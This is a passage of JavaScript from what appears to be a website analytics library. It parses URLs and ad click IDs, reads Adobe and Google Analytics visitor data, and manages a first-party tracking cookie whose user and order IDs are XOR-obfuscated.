          i.type = "text/javascript", i.async = !0, i.readyState ? i.onreadystatechange = function () {
            "loaded" !== i.readyState && "complete" !== i.readyState || (i.onreadystatechange = null, void 0 !== e && "function" == typeof e && e());
          } : i.onload = function () {
            void 0 !== e && "function" == typeof e && e();
          }, i.src = t, document.getElementsByTagName("head")[0].appendChild(i);
        }
      }
      static getAdobeAnalyticsProperty(t, e) {
        let i = this.getAdobeAnalyticsObj(e);
        return is.propertyDefined(i, t) && is.defined(i[t]) && "missing" !== i[t] ? i[t] : void 0;
      }
      static get crypto() {
        return {
          XORCipher: {
            encrypt: function (t, e, i) {
              if (void 0 !== t) {
                let s = void 0 === i ? this.randomString(6) : i,
                  o = void 0 === e ? "" : e,
                  r = this.toUTF8ByteArray(s + String.fromCharCode(0) + t),
                  n = this.toUTF8ByteArray(o),
                  a = [];
                for (let t = 0; t < r.length; t++) a[t] = a[t - 1] ^ r[t] ^ n[Math.floor(t % n.length)];
                return this.base64EncodeArray(a);
              }
            },
            decrypt: function (t, e) {
              if (void 0 !== t) {
                let i = void 0 === e ? "" : e,
                  s = this.base64DecodeArray(t),
                  o = this.toUTF8ByteArray(i),
                  r = [];
                for (let t = 0; t < s.length; t++) r[t] = s[t - 1] ^ s[t] ^ o[Math.floor(t % o.length)], r.splice(0, r.indexOf(0) + 1);
                return this.fromUTF8ByteArray(r);
              }
            },
            encryptStatic: function (t, e) {
              return this.encrypt(t, e, "");
            },
            encryptRandom: function (t, e) {
              return this.encrypt(t, e, this.randomString(6));
            },
            seed: function (t) {
              return this.randomString(t);
            },
            randomInt: function (t, e) {
              return "number" == typeof t && t > 0 && "number" == typeof e && e > 0 ? Math.floor(Math.random() * (e - t + 1)) + t : void 0;
            },
            randomString(t) {
              if ("number" == typeof t && t > 0) {
                let e = "",
                  i = 0;
                for (i = 0; i < t; i++) e += String.fromCharCode(this.randomInt(1, 65535));
                return e;
              }
            },
            fromUTF8ByteArray: function (t) {
              if (void 0 !== t) {
                let e = "";
                for (let i, s = t.length, o = 0; o < s; o++) i = t[o], e += String.fromCharCode(i > 251 && i < 254 && o + 5 < s ? 1073741824 * (i - 252) + (t[++o] - 128 << 24) + (t[++o] - 128 << 18) + (t[++o] - 128 << 12) + (t[++o] - 128 << 6) + t[++o] - 128 : i > 247 && i < 252 && o + 4 < s ? (i - 248 << 24) + (t[++o] - 128 << 18) + (t[++o] - 128 << 12) + (t[++o] - 128 << 6) + t[++o] - 128 : i > 239 && i < 248 && o + 3 < s ? (i - 240 << 18) + (t[++o] - 128 << 12) + (t[++o] - 128 << 6) + t[++o] - 128 : i > 223 && i < 240 && o + 2 < s ? (i - 224 << 12) + (t[++o] - 128 << 6) + t[++o] - 128 : i > 191 && i < 224 && o + 1 < s ? (i - 192 << 6) + t[++o] - 128 : i);
                return e = e.replace(/\0/g, "");
              }
            },
            toUTF8ByteArray: function (t) {
              if (void 0 !== t) {
                let e,
                  i,
                  s = t.length,
                  o = 0;
                for (let e = 0; e < s; e++) {
                  let i = t.charCodeAt(e);
                  o += i < 128 ? 1 : i < 2048 ? 2 : i < 65536 ? 3 : i < 2097152 ? 4 : i < 67108864 ? 5 : 6;
                }
                e = new Uint8Array(o);
                for (let s = 0, r = 0; s < o; r++) (i = t.charCodeAt(r)) < 128 ? e[s++] = i : i < 2048 ? (e[s++] = 192 + (i >>> 6), e[s++] = 128 + (63 & i)) : i < 65536 ? (e[s++] = 224 + (i >>> 12), e[s++] = 128 + (i >>> 6 & 63), e[s++] = 128 + (63 & i)) : i < 2097152 ? (e[s++] = 240 + (i >>> 18), e[s++] = 128 + (i >>> 12 & 63), e[s++] = 128 + (i >>> 6 & 63), e[s++] = 128 + (63 & i)) : i < 67108864 ? (e[s++] = 248 + (i >>> 24), e[s++] = 128 + (i >>> 18 & 63), e[s++] = 128 + (i >>> 12 & 63), e[s++] = 128 + (i >>> 6 & 63), e[s++] = 128 + (63 & i)) : (e[s++] = 252 + (i >>> 30), e[s++] = 128 + (i >>> 24 & 63), e[s++] = 128 + (i >>> 18 & 63), e[s++] = 128 + (i >>> 12 & 63), e[s++] = 128 + (i >>> 6 & 63), e[s++] = 128 + (63 & i));
                return e;
              }
            },
            unicodeInt6ToBase64: function (t) {
              return t < 26 ? t + 65 : t < 52 ? t + 71 : t < 62 ? t - 4 : 62 === t ? 43 : 63 === t ? 47 : 65;
            },
            base64ToUnicodeInt6: t => t > 64 && t < 91 ? t - 65 : t > 96 && t < 123 ? t - 71 : t > 47 && t < 58 ? t + 4 : 43 === t ? 62 : 47 === t ? 63 : 0,
            base64EncodeArray: function (t) {
              if (void 0 !== t) {
                let e = 2,
                  i = "";
                for (let s = t.length, o = 0, r = 0; r < s; r++) e = r % 3, r > 0 && 4 * r / 3 % 76 == 0 && (i += "\r\n"), o |= t[r] << (16 >>> e & 24), 2 !== e && t.length - r != 1 || (i += String.fromCharCode(this.unicodeInt6ToBase64(o >>> 18 & 63), this.unicodeInt6ToBase64(o >>> 12 & 63), this.unicodeInt6ToBase64(o >>> 6 & 63), this.unicodeInt6ToBase64(63 & o)), o = 0);
                return i.substr(0, i.length - 2 + e) + (2 === e ? "" : 1 === e ? "\x3d" : "\x3d\x3d");
              }
            },
            base64DecodeArray: function (t, e) {
              if (void 0 !== t) {
                let i = t.replace(/[^A-Za-z0-9+\/]/g, ""),
                  s = i.length,
                  o = e ? Math.ceil((3 * s + 1 >> 2) / e) * e : 3 * s + 1 >> 2,
                  r = new Uint8Array(o);
                for (let t, e, n = 0, a = 0, d = 0; d < s; d++) if (e = 3 & d, n |= this.base64ToUnicodeInt6(i.charCodeAt(d)) << 6 * (3 - e), 3 === e || s - d == 1) {
                  for (t = 0; t < 3 && a < o; t++, a++) r[a] = n >>> (16 >>> t & 24) & 255;
                  n = 0;
                }
                return r;
              }
            }
          }
        };
      }
      static newPushId() {
        return this.newPushIdObj().id;
      }
      static coalesce(t, e) {
        return is.unDefined(t) ? e : t;
      }
      static splitString(t, e) {
        let i;
        if (is.defined(t) && is.defined(e) && (i = t, is.string(i) && i.includes(e))) {
          (i = i.trim()).startsWith(e) ? i = i.substring(1) : i.endsWith(e) && (i = i.substring(0, i.length - 1));
          let t = i.split(e);
          if (Array.isArray(t) && t.length > 0) return t;
        }
      }
      static splitStringIndex(t, e, i) {
        let s;
        if (!is.unDefined(t)) return s = this.splitString(t, e), is.defined(s) && Array.isArray(s) && s.length > 0 && "number" == typeof i ? 1 === s.length ? s[0] : i < 0 && s.length > 1 ? s[s.length - -1 * i] : s[i] : s;
      }
      static trimUndefinedObj(t) {
        return Object.keys(t).filter(function (e) {
          return void 0 !== t[e] && null !== t[e] && "" !== t[e];
        }).reduce(function (e, i) {
          return e[i] = t[i], e;
        }, {});
      }
      static hasProperty(t, e) {
        return void 0 !== t ? t.hasOwnProperty(e) || e in t : void 0;
      }
      static getDataLayerJSDate() {
        return is.propertyDefined(window, "dataLayer") && is.arrayDefined(window.dataLayer) ? window.dataLayer.find(function (t) {
          return 0 in t && "js" === t[0];
        }) : void 0;
      }
      static isDataLayerJSDate() {
        return is.defined(this.getDataLayerJSDate());
      }
      static isDataLayerEventReady(t) {
        return is.defined(this.getDataLayerEvent(t));
      }
      static getDataLayerEvent(t) {
        if (is.propertyDefined(window, "dataLayer") && is.defined(window.dataLayer) && Array.isArray(window.dataLayer) && window.dataLayer.length > 0) for (const e of window.dataLayer) {
          if (is.propertyDefined(e, "event") && is.defined(e.event) && e.event === t) return e;
        } else ;
      }
      static stringify(t, e) {
        let i;
        try {
          i = JSON.stringify(t);
        } catch (e) {
          if (is.propertyDefined(t, "toString") && "function" == typeof t.toString) try {
            i = t.toString();
          } catch (t) {
            i = void 0;
          }
        }
        return this.coalesce(i, e);
      }
      static parseJSONString(t) {
        let e;
        if ("string" == typeof t && t.length > 1) {
          try {
            e = JSON.parse(t);
          } catch (i) {
            e = t;
          }
          return e;
        }
        return e;
      }
      static parseURL(t, e) {
        let i = {
          url: void 0,
          urlHashId: void 0,
          protocol: void 0,
          domain: void 0,
          domainRoot: void 0,
          domainParts: void 0,
          query: void 0,
          queryParams: void 0,
          vendorParams: {
            gclid: void 0,
            fbclid: void 0,
            msclkid: void 0,
            fbid: void 0
          },
          filename: void 0,
          hash: void 0,
          path: void 0,
          pathParts: void 0
        };
        if (is.definedString(t)) {
          let s = document.createElement("a");
          s.href = t, i.url = s.href, i.urlHashId = this.hashString(i.url).toString(), i.protocol = s.protocol.replace(":", ""), i.domain = s.hostname, i.domainRoot = i.domain, i.domainParts = s.hostname.split("."), i.query = s.search, i.queryParams = this.getQueryStringParams(s.search, e), is.defined(i.queryParams) && "object" == typeof i.queryParams && (is.propertyDefined(i.queryParams, "gclid") && (i.vendorParams.gclid = i.queryParams.gclid), is.propertyDefined(i.queryParams, "fbclid") && (i.vendorParams.fbclid = i.queryParams.fbclid), is.propertyDefined(i.queryParams, "msclkid") && (i.vendorParams.msclkid = i.queryParams.msclkid), is.propertyDefined(i.queryParams, "fbid") && (i.vendorParams.fbid = i.queryParams.fbid)), i.getQueryParam = function (t) {
            return "object" == typeof this.queryParams && t in this.queryParams ? this.queryParams[t] : void 0;
          }, i.filename = (s.pathname.match(/\/([^\/?#]+)$/i) || [, ""])[1], i.hash = s.hash.replace("#", ""), i.path = s.pathname.replace(/^([^\/])/, "/$1"), "/" === i.path ? i.pathParts = ["/"] : "string" == typeof i.path && i.path.length > 1 && (i.path = i.path.replace(/\/$/, ""), i.pathParts = i.path.replace(/^\//, "").replace(/\/$/, "").split("/")), i.domainParts.length > 2 && (i.domainRoot = i.domainParts[i.domainParts.length - 2] + "." + i.domainParts[i.domainParts.length - 1], 2 === i.domainParts[i.domainParts.length - 1].length && 2 === i.domainParts[i.domainParts.length - 1].length && (i.domainRoot = i.domainParts[i.domainParts.length - 3] + "." + i.domainRoot)), i.domainRoot = is.definedString(i.domainRoot) ? i.domainRoot : i.domain;
          for (const t of Object.keys(i)) i[t] = this.coalesce(i[t], e);
          return i;
        }
        return i;
      }
      static getQueryStringParams(t, e) {
        return t ? (/^[?#]/.test(t) ? t.slice(1) : t).split("\x26").reduce(function (t, i) {
          let [s, o] = i.split("\x3d");
          return t[s] = o ? decodeURIComponent(o.replace(/\+/g, " ")) : e, t;
        }, {}) : this.coalesce(void 0, e);
      }
      static getGAClientID() {
        return is.propertyDefined(window, "gaGlobal") && is.propertyDefined(window.gaGlobal, "vid") ? window.gaGlobal.vid : void 0;
      }
      static getAdobeVisitorObj(t) {
        return void 0 !== t && "_c" in t && "Visitor" === t._c ? t : "_satellite" in window && void 0 !== window._satellite && "company" in window._satellite && void 0 !== window._satellite.company && "orgId" in window._satellite.company && void 0 !== window._satellite.company.orgId && "" !== window._satellite.company.orgId ? window._satellite.getVisitorId() : "s" in window && void 0 !== window.s && "visitor" in window.s ? window.s.visitor : void 0;
      }
      static getAdobeAnalyticsObj(t) {
        if (void 0 !== t && is.propertyDefined(t, "_c") && "s_c" === t._c) return t;
        let e;
        return is.propertyDefined(window, "s") ? window.s : void 0 !== (e = "_satellite" in window && void 0 !== window._satellite && "company" in window._satellite && void 0 !== window._satellite.company && "orgId" in window._satellite.company && void 0 !== window._satellite.company.orgId && "" !== window._satellite.company.orgId ? window._satellite.getVisitorId() : void 0) && "_il" in e && Array.isArray(e._il) && e._il.length > 1 && "_c" in e._il[1] && "s_c" === e._il[1]._c ? e._il[1] : void 0;
      }
      static getAdobeAnalyticsConfig(t) {
        let e = this.getAdobeAnalyticsObj(t),
          i = is.defined(e) ? Object.keys(e) : void 0,
          s = {
            eVars: {},
            sProps: {}
          },
          o = ["_c", "account", "version", "server", "marketingCloudVisitorID", "analyticsVisitorID", "audienceManagerBlob", "audienceManagerLocationHint", "trackingServer", "trackingServerSecure", "channel", "campaign", "currencyCode", "products", "purchaseID", "pageName", "pageType", "pageURL", "transactionID", "purchaseID", "Ib", "referrer", "ja", "Ua", "Ka"];
        if (is.arrayDefined(o)) for (const t of o) void 0 !== i && i.includes(t) ? s[t] = "marketingCloudVisitorID" === t ? is.defined(e[t]) ? e[t].toString() : void 0 : this.coalesce(e[t], void 0) : s[t] = void 0;
        if (is.arrayDefined(i)) {
          let t;
          for (const o of i) /^eVar[0-9]{1,3}$/.test(o) && void 0 !== (t = this.coalesce(e[o], void 0)) && (s.eVars[o] = this.coalesce(e[o], void 0)), /^prop[0-9]{1,3}$/.test(o) && (void 0 !== (t = this.coalesce(e[o], void 0)) && (s.eVars[o] = this.coalesce(e[o], void 0)), s.sProps[o] = t);
        }
        return s;
      }
      static getAdobeVisitorConfig(t) {
        const e = this.getAdobeVisitorObj(t),
          i = ["_c", "version", "marketingCloudVisitorID", "marketingCloudCustomerIdHash", "marketingCloudOrgID", "marketingCloudServer", "audienceManagerBlob", "audienceManagerLocationHint", "audienceManagerServer", "visitorOptedOut", "cookieDomain", "cookieName", "sessionCookieName", "_supplementalDataIDCurrent"],
          s = {
            MCCIDH: "marketingCloudCustomerIdHash",
            MCMID: "marketingCloudVisitorID",
            MCAAMLH: "audienceManagerLocationHint",
            MCAAMB: "audienceManagerBlob",
            MCOPTOUT: "visitorOptedOut"
          },
          o = Object.keys(s),
          r = is.defined(e) ? Object.keys(e) : void 0;
        let n = {};
        if (is.arrayDefined(i)) for (const t of i) void 0 !== r && r.includes(t) ? n[t] = "marketingCloudVisitorID" === t ? is.defined(e[t]) ? e[t].toString() : void 0 : this.coalesce(e[t], void 0) : n[t] = void 0;
        if (void 0 !== r && r.includes("_fields")) {
          let t = Object.keys(e._fields);
          if (t.length > 0) for (const i of t) o.includes(i) && (n[s[i]] = "MCMID" === i ? is.defined(e[i]) ? e[i].toString() : void 0 : this.coalesce(e._fields[i], void 0));
        }
        return n;
      }
      static getNortonAnalyticsObj(t) {
        return is.defined(t) && "object" == typeof t && Object.keys(t).length > 0 ? t : is.propertyDefined(window, "nortonAnalytics") && is.defined(window.nortonAnalytics) ? this.trimUndefinedObj(window.nortonAnalytics) : void 0;
      }
      static getNortonAnalyticsVar(t, e, i) {
        let s = this.getNortonAnalyticsObj(e);
        return is.definedString(t) && void 0 !== s && is.propertyDefined(s, t) ? this.coalesce(s[t], i) : void 0;
      }
      static getWindowVar(t, e) {
        let i = window;
        return is.definedString(t) && is.propertyDefined(i, t) && is.defined(i[t]) ? this.coalesce(i[t], e) : void 0;
      }
      static getSiteVar(t, e, i, s) {
        if (is.unDefined(t) && is.unDefined(e)) return;
        let o = this.getNortonAnalyticsObj(i),
          r = this.getWindowVar(t, s),
          n = this.getNortonAnalyticsVar(e, o, s);
        return is.unDefined(r) && is.unDefined(n) ? this.coalesce(void 0, s) : is.defined(r) && is.defined(n) ? this.coalesce(r, s) : is.defined(r) && is.unDefined(n) ? this.coalesce(r, s) : is.defined(n) && is.unDefined(r) ? this.coalesce(n, s) : void 0;
      }
      static newGtagURL(t) {
        return void 0 !== t ? "https://www.googletagmanager.com/gtag/js?id\x3d" + t : void 0;
      }
    },
    NovaFrozenCookie = class extends NovaUtils {
      constructor(t, e, i, s, o) {
        super(), this.instance = is.defined(o) ? o : this.constructor.newPushIdObj(), this.key = t, this.value = e, this.exists = void 0;
        var r = this;
        this.string = {
          get length() {
            return "string" == typeof this.value ? r.constructor.hashString(this.value) : 0;
          },
          get value() {
            return r.toString();
          },
          get hashId() {
            return void 0 !== this.value ? r.constructor.hashString(this.value) : void 0;
          },
          get bytes() {
            return void 0 !== this.value ? r.constructor.getStringSize(this.value) : 0;
          }
        }, this.options = {
          expires: void 0,
          expiresDate: void 0,
          expiresSeconds: void 0,
          domain: void 0,
          path: void 0,
          secure: void 0,
          sameSite: void 0
        }, this.mod = {
          init: {
            value: e,
            time: new Date().getTime()
          },
          create: {
            value: void 0,
            time: void 0,
            string: void 0
          },
          modify: {
            value: void 0,
            oldValue: void 0,
            time: void 0,
            string: void 0
          },
          access: {
            value: void 0,
            time: void 0
          },
          delete: {
            oldValue: void 0,
            value: void 0,
            time: void 0,
            string: void 0
          },
          history: []
        }, this.init(e, i, s, this.instance.time);
      }
      get hashId() {
        return this.string.hashId;
      }
      toString() {
        return this.constructor.newCookieString(this.key, this.value, this.options.expiresDate, this.options.domain, this.options.path, this.options.secure, this.options.sameSite);
      }
      initValue(t, e = !0, i = new Date().getTime()) {
        this.value = t;
        let s = is.defined(i) ? i : new Date().getTime();
        return this.mod.access = {
          time: s,
          value: this.value
        }, this.mod.history.push({
          time: s,
          value: this.value
        }), this.exists = void 0 !== this.value, is.booleanFalse(e) && (this.exists = !1), this.value;
      }
      init(t, e, i = document.cookie, s = new Date().getTime()) {
        let o = this.constructor.coalesceValue(t);
        return is.unDefined(o) && void 0 === e ? this.value = this.getValue(i, s) : is.unDefined(o) && is.booleanFalse(e) ? (this.value = void 0, this.exists = !1) : is.defined(o) && is.booleanFalse(e) ? this.value = this.initValue(o, !1, s) : is.defined(o) && is.booleanTrue(e) ? this.value = this.initValue(o, !0, s) : is.defined(o) && void 0 === e ? this.value = this.initValue(o, !0, s) : this.value = this.getValue(i, s), this.value;
      }
      getValue(t = document.cookie, e = new Date().getTime()) {
        let i = this.constructor.getCookieValue(this.key, t);
        return this.value = this.initValue(i, is.defined(i), e), this.value;
      }
      setValue(t, e, i, s, o, r) {
        let n,
          a = this.constructor.coalesceValue(t),
          d = this.constructor.newExpirationDate(e),
          h = is.defined(i) ? i : this.constructor.getCookieDomainRoot(),
          c = this.constructor.coerceCookiePath(s),
          u = this.constructor.coerceCookieSecure(o),
          g = this.constructor.coerceCookieSameSite(r),
          l = this.constructor.newCookieString(this.key, a, d, h, c, u, g);
        document.cookie = l;
        let m = new Date().getTime();
        return this.mod.modify.oldValue = this.value, this.mod.modify.value = a, this.mod.modify.string = l, this.mod.modify.time = m, void 0 === this.value && void 0 !== a && (this.mod.create.value = a, this.mod.create.time = m, this.mod.create.string = l), "number" == typeof e && e < 0 && (this.mod.delete.time = m, this.mod.delete.oldValue = this.value, this.mod.delete.value = a, this.mod.delete.string = l), n = this.getValue(void 0, void 0), this.options.domain = h, this.options.path = c, this.options.secure = u, this.options.sameSite = g, this.options.expires = d, this.options.expiresDate = d, this.options.expiresSeconds = e, this.initValue(n, void 0 !== n, m), n;
      }
      remove() {
        return this.setValue("", -1, void 0, void 0, void 0, void 0);
      }
      setExpirationSeconds(t, e, i, s, o) {
        return !0 === this.exists && "number" == typeof t && t > 0 ? this.setValue(this.value, t, e, i, s, o) : void 0;
      }
      renew(t, e, i, s, o) {
        return this.setExpirationSeconds(t, e, i, s, o);
      }
      refresh() {
        return this.getValue(void 0, void 0), this;
      }
    },
    NovaCookie = class extends NovaFrozenCookie {
      constructor(t, e, i, s, o, r, n, a, d, h, c) {
        super(t, e, c, a, h), this.instance = is.defined(h) ? h : this.constructor.newPushIdObj(), this.options.domain = is.defined(s) ? s : this.constructor.getCookieDomainRoot(), this.options.path = this.constructor.coerceCookiePath(o), this.options.secure = this.constructor.coerceCookieSecure(r), this.options.sameSite = this.constructor.coerceCookieSameSite(n), this.options.expiresSeconds = "number" == typeof i ? i : void 0, this.options.expiresDate = "number" == typeof i ? this.constructor.newExpirationDate(i) : void 0, this.options.expires = this.options.expiresDate;
        let u = this.constructor.coalesceValue(e);
        !1 === this.exists && void 0 !== u && "number" == typeof this.options.expiresSeconds && this.options.expiresSeconds > 0 && this.setValue(u, this.options.expiresSeconds, this.options.domain, this.options.path, this.options.secure, this.options.sameSite), !0 === typeof this.exists && "boolean" == typeof d && !0 === d && void 0 !== u && "number" == typeof this.options.expiresSeconds && this.options.expiresSeconds > 0 && this.setValue(u, this.options.expiresSeconds, this.options.domain, this.options.path, this.options.secure, this.options.sameSite);
      }
    },
    NovaCookies = class extends NovaUtils {
      constructor(t, e, i, s, o, r, n) {
        super(), this.instance = is.defined(n) ? n : this.constructor.newPushIdObj(), this.options = {
          expiresSeconds: e,
          expires: this.constructor.newExpirationDate(e),
          domain: is.defined(i) ? i : this.constructor.getCookieDomainRoot(),
          path: this.constructor.coerceCookiePath(s),
          secure: this.constructor.coerceCookieSecure(o),
          sameSite: this.constructor.coerceCookieSameSite(r)
        }, this.string = {
          value: void 0,
          bytes: 0,
          length: 0,
          hashId: void 0
        }, this.cookies = {}, this.cookieJar = {}, this.keys = [], this.count = 0, this.bytes = 0, this.countLimitPressure = void 0, this.bytesLimitPressure = void 0, this.hashId = void 0, this.mod = {
          init: {
            time: this.instance.time
          },
          access: {
            time: void 0
          }
        }, this.history = [], this.init(t, n);
      }
      init(t, e) {
        this.timer = new NovaTiming("Cookies", "init"), this.timing = this.timer.timing, this.instance = is.defined(e) ? e : this.constructor.newPushIdObj();
        let i = this.constructor.getDocumentCookie(t);
        if (this.string.bytes = this.constructor.getStringSize(i), this.bytes = this.string.bytes, "number" == typeof this.bytes && this.bytes > 0 && (this.bytesLimitPressure = window.parseInt((this.bytes / 4093 * 100).toFixed(0))), this.string.length = this.constructor.getStringLength(i), this.string.value = i, this.string.hashId = this.constructor.hashString(i), this.hashId = this.string.hashId, this.history.push(this.string), this.cookieJar = this.constructor.getCookieJar(i), this.keys = Object.keys(this.cookieJar), Array.isArray(this.keys) && this.keys.length > 0) {
          this.count = this.keys.length, "number" == typeof this.count && this.count > 0 && (this.countLimitPressure = window.parseInt((this.count / 50 * 100).toFixed(0)));
          for (const t of this.keys) this.cookies[t] = new NovaCookie(t, this.cookieJar[t], this.options.expiresSeconds, this.options.domain, this.options.path, !0, this.options.sameSite, i, !1, this.instance, !0);
        }
        return this.timing = this.timer.stop(), this;
      }
      reload(t) {
        return this.init(void 0, t), this;
      }
      getCookie(t, e) {
        return "boolean" == typeof e && !0 === e && this.refresh(), t in this.cookies ? this.cookies[t] : new NovaCookie(t, void 0, this.options.expiresSeconds, this.options.domain, this.options.path, this.options.secure, this.options.sameSite, this.string.value, !1, this.instance, void 0);
      }
      getCookieValue(t, e) {
        return this.getCookie(t, e).value;
      }
      getOrSetCookie(t, e, i = this.options.expiresSeconds, s = !1) {
        return "boolean" == typeof s && !0 === s && this.refresh(), new NovaCookie(t, e, this.options.expiresSeconds, this.options.domain, this.options.path, this.options.secure, this.options.sameSite, this.string.value, !0, this.instance, !1);
      }
      setCookie(t, e, i = this.options.expiresSeconds) {
        return new NovaCookie(t, e, i, this.options.domain, this.options.path, this.options.secure, this.options.sameSite, this.string.value, !0, this.instance, !1);
      }
    },
    NovaIdModel = class extends NovaUtils {
      constructor(t, e, i, s, o, r, n, a, d, h = ".") {
        super(), this.instance = is.defined(d) ? d : this.constructor.newPushIdObj();
        var c = this;
        this.client = {
          id: void 0,
          bin: void 0,
          date: void 0,
          get dateStr() {
            return void 0 !== this.date ? c.constructor.dateToRFC3339String(this.date) : void 0;
          },
          get time() {
            return void 0 !== this.date ? this.date.getTime() : void 0;
          }
        }, this.hit = {
          id: void 0,
          number: 0,
          date: void 0,
          get dateStr() {
            return void 0 !== this.date ? c.constructor.dateToRFC3339String(this.date) : void 0;
          },
          get time() {
            return void 0 !== this.date ? this.date.getTime() : void 0;
          }
        }, this.user = {
          id: void 0,
          date: void 0,
          get dateStr() {
            return void 0 !== this.date ? c.constructor.dateToRFC3339String(this.date) : void 0;
          },
          get time() {
            return void 0 !== this.date ? this.date.getTime() : void 0;
          }
        }, this.order = {
          id: void 0,
          date: void 0,
          get dateStr() {
            return c.constructor.dateToRFC3339String(this.date);
          },
          get time() {
            return void 0 !== this.date ? this.date.getTime() : void 0;
          }
        }, this.init(t, e, i, s, o, r, n, a, d, h);
      }
      init(t, e, i, s, o, r, n, a, d, h = ".") {
        this.instance = is.defined(d) ? d : this.constructor.newPushIdObj(), this.updateClient(t, e, !1), this.updateHit(i, s, !0), this.updateUser(o, r, !0), this.updateOrder(n, a, !0), this.stringSepChar = "string" == typeof h && 1 === h.length ? h : ".";
      }
      get string() {
        return this.toString();
      }
      updateClient(t, e, i = !1) {
        let s, o;
        return is.unDefined(this.hit.id) && (s = this.instance), is.defined(t) && (s = this.constructor.decodePushID(t)), o = is.integerPositive(e) ? e : is.integerPositive(this.client.bin) ? this.client.bin : this.constructor.crypto.XORCipher.randomInt(1, 100), (is.unDefined(this.client.id) || !0 === i) && (s = is.defined(s) ? s : this.constructor.newPushIdObj(), this.client.id = s.id, this.client.date = s.date, this.client.bin = o), this.client;
      }
      updateHit(t, e, i = !0) {
        let s, o;
        return is.unDefined(this.hit.id) && (s = this.instance), is.defined(t) && (s = this.constructor.decodePushID(t)), o = is.integer(e) ? e + 1 : this.hit.number + 1, (is.unDefined(this.hit.id) || !0 === i) && (s = is.defined(s) ? s : this.constructor.newPushIdObj(), this.hit.id = s.id, this.hit.date = s.date, this.hit.number = o), this.hit;
      }
      updateUser(t = this.user.id, e = this.user.date, i = !1) {
        return (is.unDefined(this.user.id) && is.defined(t) || is.defined(this.user.id) && is.defined(t) && !0 === i) && (this.user.id = t.toString(), this.user.date = void 0 === e ? new Date() : e), this.user;
      }
      updateOrder(t, e, i = !1) {
        return (is.unDefined(this.order.id) && is.defined(t) || is.defined(this.order.id) && is.defined(t) && !0 === i) && (this.order.id = t, this.order.date = is.defined(e) ? new Date() : e, this.order.time = this.order.date.getTime()), this.order;
      }
      toString() {
        return [this.client.id ? this.client.id : "", this.client.bin ? this.client.bin : "", this.hit.id ? this.hit.id : "", this.hit.number ? this.hit.number : "", this.user.time ? this.user.time : "", this.order.time ? this.user.time : "", this.encryptedString].join(this.stringSepChar);
      }
      get encryptedString() {
        let t = {
            uid: this.user.id,
            oid: this.order.id
          },
          e = this.constructor.stringify(t);
        return is.definedString(e) ? this.constructor.crypto.XORCipher.encryptStatic(e) : void 0;
      }
      static fromString(t, e, i = ".") {
        let s,
          o,
          r = ".";
        "string" == typeof i && 1 === i.length && (r = i);
        let n = this.splitString(t, r),
          a = {
            clientId: void 0,
            clientBin: void 0,
            hitId: void 0,
            hitNumber: void 0,
            userTime: void 0,
            userDate: void 0,
            orderTime: void 0,
            orderDate: void 0,
            encryptedString: void 0,
            userId: void 0,
            orderId: void 0
          };
        if (is.arrayDefined(n)) {
          let t = {
              clientId: 0,
              clientBin: 1,
              hitId: 2,
              hitNumber: 3,
              userTime: 4,
              orderTime: 5,
              encryptedString: 6
            },
            e = {
              uid: "userId",
              oid: "orderId"
            };
          for (const e of Object.keys(t)) a[e] = n.length > t[e] && is.defined(n[t[e]]) ? n[t[e]] : void 0;
          if (a.hitNumber = is.defined(a.hitNumber) ? window.parseInt(a.hitNumber, 10) : void 0, a.clientBin = is.defined(a.clientBin) ? window.parseInt(a.clientBin, 10) : void 0, a.userDate = is.defined(a.userTime) ? this.millisecondsToDate(a.userTime) : void 0, a.orderDate = is.defined(a.orderTime) ? this.millisecondsToDate(a.orderTime) : void 0, s = is.defined(a.encryptedString) ? this.crypto.XORCipher.decrypt(a.encryptedString) : void 0, o = this.parseJSONString(s), is.definedObject(o)) for (const t of Object.keys(e)) {
            let i = e[t],
              s = o[t];
            a[i] = is.defined(s) ? s : void 0;
          }
        }
        return new this(a.clientId, a.clientBin, a.hitId, a.hitNumber, a.userId, a.userDate, a.orderId, a.orderDate, e, i);
      }
    },
    NovaIdCookie = class extends NovaUtils {
      constructor(t, e, i, s, o) {
        super(), this.timer = new NovaTiming("NovaIdCookie", "init"), this.instance = is.defined(o) ? o : this.constructor.newPushIdObj(), this.novaId = void 0, this.source = void 0;
        let r = this.constructor.daysToSeconds(365);
        "number" == typeof i && i > 0 && (r = this.constructor.daysToSeconds(i)), this.cookie = new NovaCookie("nova", void 0, r, void 0, void 0, !0, "none", s, !1, this.instance, void 0), this.options = this.cookie.options, this.cookie.exists ? (this.source = "existing", "string" == typeof this.cookie.value && this.cookie.value.length > 0 && (this.novaId = NovaIdModel.fromString(this.cookie.value))) : (this.source = "new", this.novaId = new NovaIdModel(this.instance.id, void 0, this.instance.id, 0, t, void 0, e, void 0, this.instance)), this.novaId.updateUser(t, void 0, !0), this.novaId.updateOrder(e, void 0, !0), this.updateCookie(), this.timing = this.timer.stop();
      }
      updateCookie() {
        let t = this.cookie.setValue(this.novaId.string, this.options.expiresSeconds, this.options.domain, this.options.path, this.options.secure, this.options.sameSite);
        return this.client = this.novaId.client, this.user = this.novaId.user, this.order = this.novaId.order, this.hit = this.novaId.hit, t;
      }
      setUserId(t) {
        return this.novaId.updateUser(t, void 0, !0), this.updateCookie();
      }
      setOrderId(t) {
        return this.novaId.updateOrder(t, void 0, !0), this.updateCookie();
      }
    },
    NovaLocale = class extends NovaUtils {
      constructor(t, e, i) {
        super(), this.browser = this.constructor.parseLocale(), this.site = this.constructor.parseLocale(this.constructor.newLocale(t, e), i);
      }
    },
    NovaSiteVars = class extends NovaUtils {
      constructor(t, e, i, s) {
        super(), this.instance = void 0, this.nortonAnalytics = void 0, this.adobeAnalytics = void 0, this.adobeVisitor = void 0, this.user = {
          nortonGUID: void 0,
          nortonSSO: void 0,
          gaClientId: void 0,
          adobeMarketingCloudVisitorID: void 0,
          adobeAudienceManagerBlob: void 0
        }, this.site = {
          name: void 0,
          id: void 0,
          section: void 0,
          subSection: void 0,
          sectionName: void 0,
          pageName: void 0
        }, this.locale = {
          language: void 0,
          country: void 0,
          region: void 0
        }, this.channel = {
          channel: void 0,
          originalSubChannel: void 0,
          currentSubChannel: void 0,
          trafficSource: void 0
        }, this.program = {
          id: void 0,
          type: void 0,
          inidParam: void 0,
          marketingSegment: void 0,
          promoCode: void 0,
          campaigns: void 0
        }, this.cart = {
          value: void 0,
          flowId: void 0,
          sku: void 0,
          skuDesc: void 0
        }, this.store = {
          id: void 0,
          name: void 0,
          sku: void 0,
          skuDesc: void 0,
          locale: void 0,
          userFlow: void 0,
          cartFlow: void 0
        }, this.order = {
          id: void 0,
          value: void 0,
          units: void 0,
          psn: void 0,
          promoCode: void 0,
